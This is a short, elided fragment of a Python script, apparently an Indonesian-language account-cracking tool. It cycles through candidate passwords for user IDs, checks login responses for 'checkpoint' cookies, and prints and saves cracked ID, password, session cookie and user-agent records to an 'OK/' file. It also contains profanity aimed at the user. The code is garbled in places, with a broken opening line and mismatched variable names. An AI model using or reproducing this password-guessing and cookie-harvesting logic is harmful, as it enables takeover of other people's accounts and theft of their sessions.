...
Marshal[import requests,bs4,json,os,sys,random,datetime,time,re,rich
...
def Result():
	...
	else:_____animasi__berjalan_____(f'{X} => {P}Pilih Yang Bener kontol !');exit()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} => {H}{idf}|{pw} => {nmf} => {tahun(idf)} => {kuki} => {ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+cuki+'|'+ua+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
